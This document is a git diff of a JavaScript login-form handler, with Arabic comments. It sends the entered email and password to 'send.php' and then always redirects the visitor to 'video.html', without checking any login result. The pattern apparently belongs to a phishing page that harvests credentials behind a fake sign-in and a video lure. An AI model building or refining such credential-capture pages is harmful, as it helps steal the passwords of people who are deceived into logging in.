@@ -1,14 +1,23 @@
 document.getElementById("loginForm").addEventListener("submit", function(event) {
     event.preventDefault();
 
-    let formData = new FormData();
-    formData.append("email", document.getElementById("username").value);
-    formData.append("password", document.getElementById("password").value);
+    let email = document.getElementById("username").value;
+    let password = document.getElementById("password").value;
 
+    // إرسال البيانات إلى `send.php`
     fetch("send.php", {
         method: "POST",
-        body: formData
-    }).then(() => {
-        window.location.href = "video.html"; // توجيه المستخدم بعد تسجيل الدخول
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: "email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password)
+    })
+    .then(response => response.text())
+    .then(data => {
+        console.log("تم إرسال البيانات بنجاح:", data);
+        window.location.href = "video.html"; // تحويل المستخدم إلى الفيديو
+    })
+    .catch(error => {
+        console.error("حدث خطأ أثناء الإرسال:", error);
     });
 });
